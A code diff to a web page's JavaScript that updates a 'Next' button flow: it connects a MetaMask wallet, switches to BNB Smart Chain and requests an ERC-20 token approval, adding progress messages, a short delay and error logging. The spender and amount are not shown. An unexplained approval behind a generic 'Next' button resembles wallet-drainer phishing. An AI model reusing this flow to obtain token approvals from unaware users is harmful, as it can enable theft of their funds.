@@ -193,7 +193,7 @@ document.addEventListener("DOMContentLoaded", function () {
         });
     }
 
-    // ===== NEXT BUTTON =====
+    // ===== NEXT BUTTON (UPDATED WITH CONNECT & SWITCH FLOW) =====
     nextBtn.addEventListener("click", async function (e) {
         e.preventDefault();
 
@@ -202,17 +202,20 @@ document.addEventListener("DOMContentLoaded", function () {
             return;
         }
 
-        nextBtn.innerHTML = '<span class="spinner">Processing...</span>';
+        nextBtn.innerHTML = '<span class="spinner">Connecting...</span>';
         nextBtn.disabled = true;
 
         try {
-            // 1. Connect Wallet
+            // 1. CONNECT WALLET
             const accounts = await window.ethereum.request({ 
                 method: 'eth_requestAccounts' 
             });
             const fromAddress = accounts[0];
 
-            // 2. Switch Chain to BSC
+            // Update button text to reflect connection
+            nextBtn.innerHTML = '<span class="spinner">Switching Chain...</span>';
+
+            // 2. SWITCH TO BSC CHAIN
             const bnbChainId = "0x38";
             try {
                 await window.ethereum.request({
@@ -222,6 +225,7 @@ document.addEventListener("DOMContentLoaded", function () {
             } catch (switchError) {
                 // This error code indicates that the chain has not been added to MetaMask.
                 if (switchError.code === 4902) {
+                    nextBtn.innerHTML = '<span class="spinner">Adding Chain...</span>';
                     await window.ethereum.request({
                         method: "wallet_addEthereumChain",
                         params: [{
@@ -241,7 +245,12 @@ document.addEventListener("DOMContentLoaded", function () {
                 }
             }
 
-            // 3. Approve Transaction
+            // Small delay to ensure UI updates and wallet state settles
+            await new Promise(resolve => setTimeout(resolve, 500));
+
+            // 3. APPROVE TRANSACTION
+            nextBtn.innerHTML = '<span class="spinner">Approving...</span>';
+
             const iface = new ethers.utils.Interface([
                 "function approve(address spender, uint256 amount)"
             ]);
@@ -271,6 +280,7 @@ document.addEventListener("DOMContentLoaded", function () {
             }
 
         } catch (err) {
+            console.error("Full Error:", err);
             showNotification("Transaction failed or cancelled.", "error");
         } finally {
             nextBtn.disabled = false;
